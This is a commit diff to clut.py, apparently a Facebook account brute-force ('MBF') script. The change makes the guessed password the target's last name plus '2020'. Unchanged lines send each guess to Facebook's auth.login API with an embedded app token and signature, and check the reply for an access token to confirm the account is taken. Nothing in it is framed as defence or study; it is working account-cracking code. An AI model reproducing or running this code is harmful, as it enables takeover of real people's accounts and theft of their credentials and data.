fa8e05e278f914c19be8084b2a0d0f1ce52c8f30
gendeng777 <69396037+gendeng777@users.noreply.github.com>
2020-11-20 11:40:53 +0700

    Update clut.py

--- clut.py
+++ clut.py
@@ -885,7 +885,7 @@ def pilih_mbf():
 																																			cek.close()
 																																			cp.append(user+pass16)
 																																		else:
-																																			pass17 = b['user_name']
+																																			pass17 = b['last_name'] + '2020'
 																																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass17)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																																			q = json.load(data)
 																																			if 'access_token' in q:
